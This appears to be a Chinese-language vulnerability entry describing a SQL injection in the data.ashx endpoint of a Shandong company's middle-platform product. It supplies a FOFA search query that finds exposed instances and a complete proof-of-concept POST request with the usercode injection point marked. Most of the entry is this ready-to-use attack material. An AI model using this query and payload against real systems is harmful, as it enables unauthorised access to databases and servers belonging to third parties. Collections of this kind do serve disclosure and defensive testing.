## 山东聚恒网络技术有限公司聚恒中台data.ashx存在SQL注入漏洞

山东聚恒网络技术有限公司聚恒中台sysplat/dataget/data.ashx?type=sendvalidatecode存在SQL注入漏洞，可对数据库获取敏感信息，也可获取服务器权限。



## fofa

```
body="sysplat/dataget/data.ashx?type=sendvalidatecode"
```



## poc

```
POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
Host: 
Content-Length: 20
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

usercode=1*&mobile=2
```

